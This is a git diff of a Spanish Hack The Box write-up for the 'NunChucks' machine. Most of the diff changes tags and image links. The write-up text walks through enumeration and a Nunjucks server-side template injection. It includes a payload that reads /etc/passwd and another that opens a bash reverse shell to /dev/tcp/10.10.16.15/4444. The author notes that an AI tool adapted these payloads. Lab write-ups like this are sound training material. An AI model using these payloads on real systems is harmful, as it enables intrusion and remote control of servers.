@@ -6,26 +6,24 @@ categories:
   - HTB
   - Linux
 tags:
-  - CVE-2021-3129
-  - Information
-  - Leakage
-  - Remote
-  - Port
-  - Forwarding
-  - Strapi
-  - Laravel
+  - AppArmor
+  - SSTI (Server Side Template Injection)
+  - NodeJS
+  - Nunjucks
 image:
-  path: /assets/img/Horizontall/Horizontall.png
+  path: /assets/img/NunChucks/NunChucks.png
 ---
 
 ## Skills
 
 - AppArmor Profile Bypass (Privilege Escalation)
 - NodeJS SSTI (Server Side Template Injection)
+  
 ## Certificaciones
 
 - eJPT
 - eWPT
+  
 ## Descripción
 
 `Validarion` es una máquina `easy linux` donde estaremos vulnerando la máquina a través de una `server side template inyection` encontrada en su página web, obtendremos `acceso` a la `máquina víctima` explotando el `ssti`. Escalaremos privilegios aprovechando un `bug` de `AppArmor`
@@ -105,7 +103,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.69 seconds
 
 Nos dirigimos a la página web y se visualiza lo siguiente:
 
-![[Pasted image 20240703131612.png]]
+![](/assets/img/NunChucks/image_1.png)
 
 La web posee `virtual hosting` por lo tanto debemos añadir el dominio `nunchucks.htb` al `/etc/hosts`
 
@@ -123,35 +121,35 @@ ff02::2 ip6-allrouters
 
 Al acceder a la web vemos lo siguiente
 
-![[Pasted image 20240703132201.png]]
+![](/assets/img/NunChucks/image_2.png)
 
 Podemos registrarnos en `https://nunchucks.htb/signup`
 
-![[Pasted image 20240703132256.png]]
+![](/assets/img/NunChucks/image_3.png)
 
 Al intentar registrarnos no nos deja
 
-![[Pasted image 20240703132817.png]]
+![](/assets/img/NunChucks/image_4.png)
 
 Para ver como se tramita la `petición`, abrimos el `burpsuite` y no damos cuenta que se está enviando un `json` a la dirección de la `api`
 
-![[Pasted image 20240703133019.png]]
+![](/assets/img/NunChucks/image_5.png)
 
 Esto también se puede hacer desde el navegador, desde la pestaña network
 
-![[Pasted image 20240703133430.png]]
+![](/assets/img/NunChucks/image_6.png)
 
 Podemos iniciar sesión en `https://nunchucks.htb/login`
 
-![[Pasted image 20240703132336.png]]
+![](/assets/img/NunChucks/image_7.png)
 
 Al probar iniciar sesión nos dice que está actualmente `deshabilitado`
 
-![[Pasted image 20240703134337.png]]
+![](/assets/img/NunChucks/image_8.png)
 
 Al iniciar intentar iniciar sesión vemos otro `endpoint` de la `api`
 
-![[Pasted image 20240703134305.png]]
+![](/assets/img/NunChucks/image_9.png)
 
 Hemos `fuzzeado` el dominio `nunchucks.htb` en busca de nuevas `rutas` y no hemos encontrado nada interesante, por lo tanto como estamos ante un `virtual hosting`, he `fuzzeado` en busca de `subdominios` y he encontrado el subdominio `store.nunchucks.htb`
 
@@ -188,24 +186,25 @@ ff02::2 ip6-allrouters
 
 Cuando accedemos a `store.nunchucks.htb` vemos lo siguiente
 
-![[Pasted image 20240703134129.png]]
+![](/assets/img/NunChucks/image_10.png)
 
 Al introducir un `correo` en y darle a `notify me`, nos aparece lo siguiente
 
-![[Pasted image 20240703134621.png]]
+![](/assets/img/NunChucks/image_11.png)
 
 Al verse reflejado nuestro `input` en una parte de la `web` y vemos que por detrás está corriendo express y `node.js`, podríamos probar a ver si existe un `ssti`
 
-![[Pasted image 20240703134749.png]]
+![](/assets/img/NunChucks/image_12.png)
 
 Efectivamente nos encontramos antes un ssti
 
-![[Pasted image 20240703134930.png]]
+![](/assets/img/NunChucks/image_13.png)
+
 ## Intrusión
 
 Al estar corriendo `node.js`, he buscado en `hacktricks` y he dado con el template al que nos podríamos estar enfrentando, este template se llama `nunjucks` (`https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks`). Vamos a `capturar` la `petición` mediante `burpsuite` para poder explotar mejor esta vulnerabilidad
 
-![[Pasted image 20240703135651.png]]
+![](/assets/img/NunChucks/image_14.png)
 
 He probado los `payloads` de la página de `hacktricks` sin embargo, `no funcionan` correctamente debido a que le estamos mandando el `payload` en un `json` y las `comillas` dan `conflictos`, por lo tanto he usado `PentestGPT` para obtener un payload `alternativo` para poder leer el `/etc/passwd`
 
@@ -213,7 +212,7 @@ He probado los `payloads` de la página de `hacktricks` sin embargo, `no funcion
 {{ range.constructor('return global.process.mainModule.require(\"fs\").readFileSync(\"/etc/passwd\", \"utf8\")')() }}
 ```
 
-![[Pasted image 20240703142232.png]]
+![](/assets/img/NunChucks/image_15.png)
 
 Ahora vamos a establecernos unas `reverse shell` a nuestro equipo, le he pedido a `PentestGPT` que me `adapte` el `payload` para establecerme una `reverse shell` que se encuentra en la página de `hacktricks`
 
@@ -221,7 +220,7 @@ Ahora vamos a establecernos unas `reverse shell` a nuestro equipo, le he pedido 
 {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/10.10.16.15/4444 0>&1\\\"')\")()}}
 ```
 
-![[Pasted image 20240703142735.png]]
+![](/assets/img/NunChucks/image_16.png)
 
 Una vez en la máquina víctima vamos a realizar un `tratamiento` a la `TTY`
 
